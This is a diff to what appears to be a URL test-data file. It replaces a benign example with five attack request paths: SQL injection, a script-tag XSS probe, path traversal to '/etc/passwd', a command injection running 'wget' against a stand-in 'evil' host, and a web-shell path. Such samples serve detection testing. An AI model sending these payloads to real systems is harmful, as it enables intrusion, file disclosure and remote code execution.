@@ -1,2 +1,6 @@
 url
-http://example.com/?id=1
+/index.php?id=1 OR 1=1
+/search?q=<script>alert(1)</script>
+/view.php?file=../../etc/passwd
+/product?id=5; wget http://evil/x.sh
+/wp-content/plugins/cmd.jsp
